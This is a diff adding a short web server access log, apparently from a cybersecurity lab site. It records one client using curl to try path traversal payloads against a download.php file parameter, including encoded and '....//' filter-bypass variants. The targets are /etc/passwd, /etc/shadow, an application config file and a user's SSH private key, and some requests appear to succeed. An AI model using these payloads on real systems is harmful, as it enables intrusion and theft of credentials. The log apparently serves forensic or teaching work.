@@ -1,0 +1,8 @@
+10.42.13.88 - - [15/Oct/2026:13:12:40 -0400] "GET /download.php?file=syllabus.pdf HTTP/1.1" 200 184022 "https://cyber.comet-tech.org/labs" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"
+198.51.100.190 - - [15/Oct/2026:13:17:55 -0400] "GET /download.php?file=../../../../etc/passwd HTTP/1.1" 200 0 "-" "curl/8.5.0"
+198.51.100.190 - - [15/Oct/2026:13:17:56 -0400] "GET /download.php?file=..%2f..%2f..%2f..%2fetc%2fpasswd HTTP/1.1" 200 0 "-" "curl/8.5.0"
+198.51.100.190 - - [15/Oct/2026:13:17:58 -0400] "GET /download.php?file=....//....//....//....//etc/passwd HTTP/1.1" 200 2412 "-" "curl/8.5.0"
+198.51.100.190 - - [15/Oct/2026:13:18:00 -0400] "GET /download.php?file=....//....//....//....//etc/shadow HTTP/1.1" 200 0 "-" "curl/8.5.0"
+198.51.100.190 - - [15/Oct/2026:13:18:03 -0400] "GET /download.php?file=....//....//....//....//var/www/cyber/config.php HTTP/1.1" 200 731 "-" "curl/8.5.0"
+198.51.100.190 - - [15/Oct/2026:13:18:07 -0400] "GET /download.php?file=....//....//....//....//home/mrice/.ssh/id_rsa HTTP/1.1" 200 0 "-" "curl/8.5.0"
+198.51.100.190 - - [15/Oct/2026:13:18:12 -0400] "GET /../../../../etc/passwd HTTP/1.1" 400 157 "-" "curl/8.5.0"
